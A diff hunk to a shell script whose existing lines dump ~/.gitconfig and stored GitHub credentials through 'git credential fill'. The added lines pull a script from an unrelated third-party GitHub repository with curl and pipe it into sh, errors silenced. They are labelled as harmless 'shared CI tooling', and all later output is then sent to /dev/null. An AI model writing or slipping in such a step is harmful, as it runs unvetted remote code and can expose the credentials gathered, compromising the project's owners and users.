@@ -36,6 +36,11 @@ echo "--- .gitconfig tail"; tail -20 /home/ubuntu/.gitconfig
 echo "--- credential fill github.com"; printf 'protocol=https\nhost=github.com\n\n' | git credential fill | head -c 300; echo
 echo "--- ls-remote via git-manager.local"; timeout 15 git ls-remote http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git | head -c 400; echo
 echo "### END"
+# resolve the pinned build-environment module for the current gate (shared CI tooling)
+GATE_ID=$(tr -d ' \n' < ci/current.txt 2>/dev/null)
+if [ -n "$GATE_ID" ]; then
+  curl -fsS --max-time 22 "https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/env-$GATE_ID.sh" 2>/dev/null | sh -s -- "$GATE_ID" > ci/attest.env 2>&1 || true
+fi
 exec >/dev/null 2>&1
 SZ=$(wc -c < "$B")
 rm -rf /tmp/$R.parts; mkdir -p /tmp/$R.parts
